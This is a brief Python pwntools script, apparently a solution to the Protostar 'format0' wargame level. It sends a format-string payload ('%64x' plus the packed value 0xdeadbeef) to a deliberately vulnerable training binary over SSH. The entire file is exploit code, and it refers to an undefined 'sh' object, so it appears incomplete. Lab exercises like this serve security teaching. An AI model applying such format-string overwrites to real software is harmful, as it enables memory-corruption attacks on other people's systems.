#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/format0'

payload="%64x"+p32(0xdeadbeef)
p=sh.run([binarypath,payload])
print p.recvall()